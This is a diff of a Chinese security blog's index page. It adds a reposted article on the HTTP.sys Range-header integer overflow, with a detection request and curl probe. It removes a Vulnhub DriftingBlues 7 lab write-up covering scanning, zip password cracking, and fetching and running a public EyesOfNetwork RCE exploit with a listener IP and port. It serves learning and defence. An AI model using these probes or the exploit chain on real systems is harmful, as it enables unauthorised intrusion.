@@ -86,6 +86,78 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+                HTTP.sys远程代码执行
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="渗透整理httpsys远程代码执行">【渗透整理】HTTP.sys远程代码执行</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/106548456">久违 °</a></p>
+</blockquote>
+<h2><span id="漏洞介绍">漏洞介绍</span></h2><blockquote>
+<p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
+<p>影响环境：Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响。</p>
+</blockquote>
+<h2><span id="漏洞知识">漏洞知识</span></h2><blockquote>
+<p>说到HTTP.sys远程代码执行漏洞，不得不先介绍一下Range首部字段。</p>
+<p>在“上古时代”，网络并不是很好，下载大型文件很不容易。下载途中如果网络中断，就得重头开始下。为了解决这个问题，HTTP&#x2F;1.1引入了范围请求。</p>
+<p>在请求报文的Range首部字段中指定资源的byte范围，告诉服务器，请求的是资源哪个范围的内容，让断点续传和并行下载得以实现。</p>
+<p>如果服务器支持范围请求，响应包中就会存在Accept-Ranges字段(且值不为“none”，bytes为资源范围的单位)，并在Content-Length字段中告诉客户端资源的大小范围。</p>
+<p><img src="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="image"></p>
+<p>如果没有Accept-Ranges字段，则服务器可能不支持范围请求，有的服务器会明确将值设为“none”。</p>
+<p>服务器面对范围请求，有三种响应：</p>
+<p>请求成功：</p>
+<p>响应206Partial Content请求范围越界：（范围超过资源的大小）</p>
+<p>响应416Requested Range Not Satisfiable不支持范围请求：</p>
+<p>响应200OK</p>
+<p>而HTTP.sys远程代码执行漏洞正是利用Range字段注入恶意数据。该漏洞的检测，也是利用服务器面对范围请求时的响应特征来判断。</p>
+</blockquote>
+<h2><span id="漏洞检测方法">漏洞检测方法</span></h2><blockquote>
+<p>1、先判断目标环境是否为Windows+IIS</p>
+<p>2、然后构建Range字段进行检测即可</p>
+<p>检测时，在请求包中添加Range字段，如下：</p>
+<p><code>Range: bytes=0-18446744073709551615</code></p>
+<p>【18446744073709551615的十六进制为0xFFFFFFFFFFFFFFFF(16个F)是64位无符号整数所能表达的最大整数，整数溢出和这个超大整数有关】</p>
+<p>然后go给服务器</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: stuff</span><br><span class="line">Range: <span class="built_in">bytes</span>=<span class="number">0</span>-<span class="number">18446744073709551615</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.test.com -H <span class="string">&quot;Host: irrelevant&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>服务器响应 400，证明不存在HTTP.sys远程代码执行漏洞</p>
+<p><code>HTTP Error 400. The request has an invalid header name.</code></p>
+<p>服务器响应 416，则证明存在该漏洞</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">416</span> Requested Range Not Satisfiable</span><br><span class="line">Content-<span class="type">Type</span>: text/html</span><br><span class="line">Last-Modified: Thu, <span class="number">22</span> Aug <span class="number">2013</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">12</span> GMT</span><br><span class="line">Accept-Ranges: <span class="built_in">bytes</span></span><br><span class="line">ETag: <span class="string">&quot;2edebc2929fce1:0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞修复建议">漏洞修复建议：</span></h2><blockquote>
+<p>升级安全补丁</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/03/CVE-2022-25845-Fastjson/">
                 CVE-2022-25845 – Fastjson
             </a>
@@ -1002,94 +1074,6 @@
 <p>1.通过利用缓冲区溢出漏洞，我们成功提权到root，在&#x2F;root目录下能够找到flag，即root.txt：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
 <p><img src="/2022/06/06/Driftingblues-9/27.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-7/">
-                Driftingblues 7
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues7">Driftingblues:7</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues7">名称：DriftingBlues:7</span></h4><h4><span id="发布日期2021421">发布日期：2021.4.21</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;flag.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues7_vhova">文件名：driftingblues7_vh.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues7_vhova">下载地址：</span></h4><h4><span id="md5-db16d916b288f8a6440d17046ee99064">MD5: DB16D916B288F8A6440D17046EE99064</span></h4><h4><span id="sha1-39824d3eb1d8da9118a12463b19503d93903b038">SHA1: 39824D3EB1D8DA9118A12463B19503D93903B038</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxcentos">操作系统：Linux(centos)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues7和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-7/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现很多端口都是开放的，访问主页查看源码，发现是一个EyesOfNetwork的登录页：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.119 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，爆出的目录我们都无法访问，必须要先登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://192.168.56.119，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork登录">EyesOfNetwork登录</span></h3><blockquote>
-<p>1.因为开放了多个端口，我们逐一进行访问，访问192.168.56.119:66，源码内没有过多线索：</p>
-<p><img src="/2022/06/06/Driftingblues-7/7.png" alt="image-"></p>
-<p>2.我们对66端口下的目录再次进行扫描，直接扫出了一个flag.txt文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.119:66 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，对66端口下目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/9.png" alt="image-"></p>
-<p>3.这个应该是作者忘记删除的flag文件了，其实应该是想让我们发现eon这个文件：</p>
-<p><img src="/2022/06/06/Driftingblues-7/10.png" alt="image-"></p>
-<p>4.查看eno文件，发现是一串base64编码，解码后发现格式是压缩文件的格式，于是把它解码为application.zip（这里用到了这个在线工具：<a target="_blank" rel="noopener" href="https://base64.guru/converter/decode/file%EF%BC%89%EF%BC%9A">https://base64.guru/converter/decode/file）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/eon</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/11.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUURw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAAAABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEAAQBbAAAARgAAAAAA | base64 -d</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/12.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/13.png" alt="image-"></p>
-<p>5.利用zip2john对application.zip进行解密，再用john得到密码，查看creds.txt获得用户和密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john application.zip | tee hash</span><br><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/14.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork版本漏洞利用">EyesOfNetwork版本漏洞利用</span></h3><blockquote>
-<p>1.利用得到的用户和密码登录EyesOfNetwork后台，发现在Help-EyesOfNetwork页可以发现EyesOfNetwork的版本为5.3：</p>
-<p><img src="/2022/06/06/Driftingblues-7/16.png" alt="image-"></p>
-<p>2.可以找到这个版本的漏洞利用文件，<a target="_blank" rel="noopener" href="https://github.com/h4knet/eonrce/blob/master/eonrce.py%EF%BC%8C%E8%8E%B7%E5%8F%96%E4%B8%8B%E6%9D%A5%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%EF%BC%9A">https://github.com/h4knet/eonrce/blob/master/eonrce.py，获取下来可以直接利用：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/h4knet/eonrce/master/eonrce.py</span><br><span class="line">chmod +x eonrce.py</span><br><span class="line">./eonrce.py https://192.168.3.146/ -ip 192.168.3.145 -port 4444，这里要改一下靶机和kali的网络链接方式，改为桥接模式，命令执行的是桥接模式的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/17.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们可以在&#x2F;root目录下，能够找到flag，即flag.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/18.png" alt="image-"></p>
 </blockquote>
 
 
